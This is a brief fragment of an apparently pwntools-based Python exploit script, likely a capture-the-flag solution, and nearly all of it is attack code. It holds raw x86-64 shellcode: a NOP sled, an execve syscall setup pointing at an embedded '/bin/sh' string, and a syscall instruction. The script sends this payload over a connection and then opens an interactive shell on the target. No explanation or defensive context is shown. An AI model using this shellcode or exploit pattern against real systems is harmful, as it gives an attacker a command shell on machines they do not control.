...
def main():
    ...
    shellcode = b"\x90\x90\x90\x90\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC7\x00\x70\x33\x01\x48\x83\xC7\x26\x0F\x05/bin/sh\x00"
    r.send(shellcode)
    r.interactive()
